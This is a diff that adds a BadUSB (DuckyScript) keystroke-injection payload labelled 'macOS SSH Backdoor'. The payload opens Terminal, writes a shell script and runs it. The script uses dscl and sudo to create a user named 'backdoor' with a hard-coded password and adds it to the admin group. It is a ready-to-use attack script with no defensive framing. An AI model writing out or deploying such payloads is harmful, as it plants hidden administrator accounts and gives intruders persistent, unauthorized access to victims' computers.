@@ -1,0 +1,38 @@
+REM Title: macOS SSH Backdoor
+REM Author: BadUSB Library
+REM Description: Creates SSH backdoor for remote access
+REM Target: macOS 10.15+
+REM Category: Remote Access
+REM Type: Directly Ready
+
+REM Open Terminal
+DELAY 2000
+GUI SPACE
+DELAY 1000
+STRING Terminal
+ENTER
+DELAY 3000
+
+REM Create SSH backdoor
+STRING cat > /tmp/ssh_backdoor.sh << 'EOF'
+#!/bin/bash
+# Create backdoor user
+sudo dscl . create /Users/backdoor
+sudo dscl . create /Users/backdoor UserShell /bin/bash
+sudo dscl . create /Users/backdoor RealName "Backdoor User"
+sudo dscl . create /Users/backdoor UniqueID 1001
+sudo dscl . create /Users/backdoor PrimaryGroupID 1000
+sudo dscl . create /Users/backdoor NFSHomeDirectory /Users/backdoor
+sudo dscl . passwd /Users/backdoor backdoor123
+sudo dscl . append /Groups/admin GroupMembership backdoor
+EOF
+ENTER
+DELAY 2000
+
+STRING chmod +x /tmp/ssh_backdoor.sh
+ENTER
+DELAY 1000
+
+STRING /tmp/ssh_backdoor.sh
+ENTER
+DELAY 3000
